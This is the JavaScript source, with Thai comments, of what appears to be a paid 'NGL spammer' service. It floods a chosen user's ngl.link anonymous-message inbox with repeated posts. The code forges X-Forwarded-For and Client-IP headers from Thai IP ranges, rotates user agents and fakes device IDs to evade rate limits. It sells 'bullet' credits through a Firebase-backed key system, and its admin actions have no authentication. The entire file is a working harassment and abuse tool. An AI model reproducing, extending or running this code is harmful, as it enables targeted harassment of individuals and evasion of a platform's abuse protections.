const FIREBASE_DB_URL = "https://shop-25ffb-default-rtdb.asia-southeast1.firebasedatabase.app";

async function getFirebaseKeys() {
    try {
        const res = await fetch(`${FIREBASE_DB_URL}/ngl_spammer_keys.json`);
        return await res.json() || {};
    } catch (e) { return {}; }
}
async function updateSingleKeyField(key, fields) {
    await fetch(`${FIREBASE_DB_URL}/ngl_spammer_keys/${key}.json`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(fields)
    });
}
async function updateFirebaseKeys(keys) {
    await fetch(`${FIREBASE_DB_URL}/ngl_spammer_keys.json`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(keys)
    });
}
async function getGlobalCounter() {
    try {
        const res = await fetch(`${FIREBASE_DB_URL}/ngl_global_counter.json`);
        return await res.json() || 0;
    } catch (e) { return 0; }
}
async function increaseGlobalCounter() {
    try {
        let cur = await getGlobalCounter();
        await fetch(`${FIREBASE_DB_URL}/ngl_global_counter.json`, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(cur + 1)
        });
    } catch (e) {}
}
async function getMaintenanceStatus() {
    try {
        const res = await fetch(`${FIREBASE_DB_URL}/ngl_global_shutdown.json`);
        const val = await res.json();
        return val === true || val === "true";
    } catch (e) { return false; }
}

function generateAdvancedIP() {
    const pools = [
        [49, 228, 0, 255], [171, 96, 0, 254], [182, 52, 0, 254], [124, 120, 0, 254], [180, 180, 0, 255]
    ];
    const base = pools[Math.floor(Math.random() * pools.length)];
    return `${base[0]}.${base[1]}.${Math.floor(Math.random() * (base[3] - base[2] + 1)) + base[2]}.${Math.floor(Math.random() * 254) + 1}`;
}

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'รูปแบบไม่ถูกต้อง' });

    try {
        const { action, username, question, deviceId, key, targetKey, targetCredit, requestedMode, isFirstPacket, shutdownStatus } = req.body;

        // เช็กสถานะการสั่งปิดหน้าเว็บหลักก่อนเลย [ระบบที่ 4]
        const isSystemShutdownActive = await getMaintenanceStatus();
        
        if (action === 'check_maintenance') {
            return res.status(200).json({ isShutdown: isSystemShutdownActive });
        }

        let allowedKeys = await getFirebaseKeys();
        let globalCount = await getGlobalCounter();

        // ==========================================
        // 🛰️ แผงควบคุมระบบ (ADMIN ZONE)
        // ==========================================
        if (action === 'admin_get_keys') {
            return res.status(200).json({ success: true, keys: allowedKeys, globalCounter: globalCount, isSystemShutdown: isSystemShutdownActive });
        }
        if (action === 'admin_global_shutdown') {
            await fetch(`${FIREBASE_DB_URL}/ngl_global_shutdown.json`, {
                method: 'PUT',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(shutdownStatus === 'true')
            });
            return res.status(200).json({ success: true, message: `🚨 อัปเดตสถานะการปิดเซิร์ฟเวอร์หลักเป็น [ ${shutdownStatus} ] เรียบร้อย!` });
        }
        if (action === 'admin_add_key') {
            const parsedCredit = parseInt(targetCredit) || 1000;
            allowedKeys[targetKey] = { usedBy: "none", isSpeedAllowed: false, isBlasting: false, currentAttackTarget: "-", lastMessageSent: "-", lastActiveTime: "-", forceStopRequested: false, credits: parsedCredit };
            await updateFirebaseKeys(allowedKeys);
            return res.status(200).json({ success: true, message: `➕ เพิ่มคีย์ [ ${targetKey} ] เติมกระสุนให้ ${parsedCredit} นัด สำเร็จ!` });
        }
        if (action === 'admin_toggle_speed') {
            if (allowedKeys[targetKey]) {
                const cur = allowedKeys[targetKey].isSpeedAllowed || false;
                await updateSingleKeyField(targetKey, { isSpeedAllowed: !cur });
                return res.status(200).json({ success: true, message: `⚡ คีย์ [ ${targetKey} ] เปิดโหมดเร็ว: ${!cur ? 'เปิดแล้ว' : 'ปิดแล้ว'}` });
            }
            return res.status(404).json({ error: 'หาคีย์นี้ไม่เจออะบอส' });
        }
        if (action === 'admin_delete_key') {
            if (allowedKeys[targetKey]) { delete allowedKeys[targetKey]; await updateFirebaseKeys(allowedKeys); }
            return res.status(200).json({ success: true, message: `❌ ลบคีย์ทิ้งถาวรแล้วจ้า` });
        }
        if (action === 'admin_reset_key') {
            if (allowedKeys[targetKey]) {
                await updateSingleKeyField(targetKey, { usedBy: "none", forceStopRequested: false, isBlasting: false, currentAttackTarget: "-" });
            }
            return res.status(200).json({ success: true, message: `🔄 รีเซ็ตล็อกดีไวซ์ของคีย์นี้สำเร็จแล้ว` });
        }
        if (action === 'admin_force_stop') {
            if (allowedKeys[targetKey]) {
                await updateSingleKeyField(targetKey, { forceStopRequested: true, isBlasting: false, currentAttackTarget: "🛑 แอดมินสับคัตเอาต์" });
                return res.status(200).json({ success: true, message: `🛑 สั่งระงับการยิงคีย์ [ ${targetKey} ] เรียบร้อย!` });
            }
            return res.status(404).json({ error: 'หาคีย์ไม่เจอจ้า' });
        }
        if (action === 'client_finish') {
            if (allowedKeys[key]) { await updateSingleKeyField(key, { isBlasting: false, currentAttackTarget: "-" }); }
            return res.status(200).json({ success: true });
        }

        // ==========================================
        // 🔒 ตรวจสอบสิทธิ์และการบล็อก
        // ==========================================
        const isPermanentKey = (key === 'admin' || key === 'mhon');

        // สกัดกั้นทันทีถ้าบอสสั่งปิดระบบหนีชั่วคราว (ยกเว้นแอดมินยิงเอง)
        if (isSystemShutdownActive && !isPermanentKey) {
            return res.status(200).json({ isSystemOffline: true, error: 'ขออภัย แอดมินใหญ่สั่งปิดระบบทำลายล้างชั่วคราว' });
        }

        let keyData = allowedKeys[key];
        if (!isPermanentKey) {
            if (!keyData) return res.status(403).json({ error: 'คีย์มั่วป่ะเนี่ย หาไม่เจอ' });
            
            // ตรวจสอบระบบเครดิตกระสุน [ระบบที่ 2]
            if (keyData.credits !== undefined && keyData.credits <= 0) {
                return res.status(200).json({ outOfCredits: true, error: 'กระสุนหมดแล้วจ้า' });
            }
            if (keyData.forceStopRequested === true || keyData.forceStopRequested === "true") {
                return res.status(200).json({ forceStopped: true, error: 'โดนแอดมินหลักสั่งระงับงาน' });
            }
            if (requestedMode === 'cyber' && !keyData.isSpeedAllowed) {
                return res.status(403).json({ error: 'คีย์นี้ยังไม่ได้ปลดล็อกโหมดโหดความเร็วแสง' });
            }
            if (keyData.usedBy && keyData.usedBy !== "none" && keyData.usedBy !== deviceId) {
                return res.status(403).json({ error: 'คีย์นี้โดนเครื่องอื่นแย่งใช้ไปแล้ว' });
            }
            if (!keyData.usedBy || keyData.usedBy === "none") {
                await updateSingleKeyField(key, { usedBy: deviceId });
            }
        }

        const cleanUsername = username.trim().replace('https://ngl.link/', '');
        const timeString = new Date().toLocaleTimeString('th-TH', { timeZone: 'Asia/Bangkok' });

        // บันทึก Log แค่นัดแรกเพื่อเซฟโควตา Database คลาวด์
        if (!isPermanentKey && (isFirstPacket || keyData.currentAttackTarget !== cleanUsername)) {
            await updateSingleKeyField(key, {
                isBlasting: true,
                currentAttackTarget: cleanUsername,
                lastMessageSent: question || '',
                lastActiveTime: timeString,
                forceStopRequested: false 
            });
        }

        // ==========================================
        // 🚀 SPAM ENGINE + SILENT AUTO-RETRY
        // ==========================================
        const browserPool = [
            { ua: 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/604.1', plat: '"iOS"', brand: '"Safari";v="18"' },
            { ua: 'Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36', plat: '"Android"', brand: '"Google Chrome";v="140"' },
            { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36', plat: '"Windows"', brand: '"Google Chrome";v="141"' }
        ];

        const sendPacketWithRetry = async () => {
            let attempt = 0;
            while (attempt < 2) {
                try {
                    const spoofedIP = generateAdvancedIP();
                    const browser = browserPool[Math.floor(Math.random() * browserPool.length)];
                    const fakeBoundaryId = 'MCH_SPOOF_' + Math.random().toString(36).substring(2, 10).toUpperCase();
                    const rawBody = `username=${encodeURIComponent(cleanUsername)}&question=${encodeURIComponent(question || '')}&deviceId=${encodeURIComponent(fakeBoundaryId)}&gameSlug=&referrer=`;

                    const response = await fetch('https://ngl.link/api/submit', {
                        method: 'POST',
                        headers: {
                            'accept': '*/*',
                            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                            'user-agent': browser.ua,
                            'referer': `https://ngl.link/${encodeURIComponent(cleanUsername)}`,
                            'X-Forwarded-For': spoofedIP,
                            'Client-IP': spoofedIP,
                            'sec-ch-ua-platform': browser.plat,
                            'sec-ch-ua': `${browser.brand}, "Not=A?Brand";v="99"`,
                            'X-Requested-With': 'XMLHttpRequest'
                        },
                        body: rawBody,
                        signal: AbortSignal.timeout(3500)
                    });

                    if (response.ok) {
                        // หักเครดิตกระสุนในระบบ [ระบบที่ 2]
                        if (!isPermanentKey && keyData && keyData.credits !== undefined) {
                            let currentCredits = Math.max(0, keyData.credits - 1);
                            await updateSingleKeyField(key, { credits: currentCredits });
                        }
                        // บวกสถิติแผงมอนิเตอร์ [ระบบที่ 3]
                        await increaseGlobalCounter();
                        return true;
                    }
                } catch (e) {}
                attempt++;
            }
            return false;
        };

        if (requestedMode === 'cyber') {
            Promise.all([sendPacketWithRetry(), sendPacketWithRetry(), sendPacketWithRetry(), sendPacketWithRetry()]).catch(() => {});
            return res.status(200).json({ success: true, speed: "ultra_boosted" });
        }

        const successNormal = await sendPacketWithRetry();
        if (successNormal) return res.status(200).json({ success: true });
        return res.status(429).json({ error: `โดนระบบกรอง NGL ดักไว้ชั่วคราว` });

    } catch (error) {
        return res.status(500).json({ error: 'สะท้อน Firewall สำเร็จ' });
    }
}

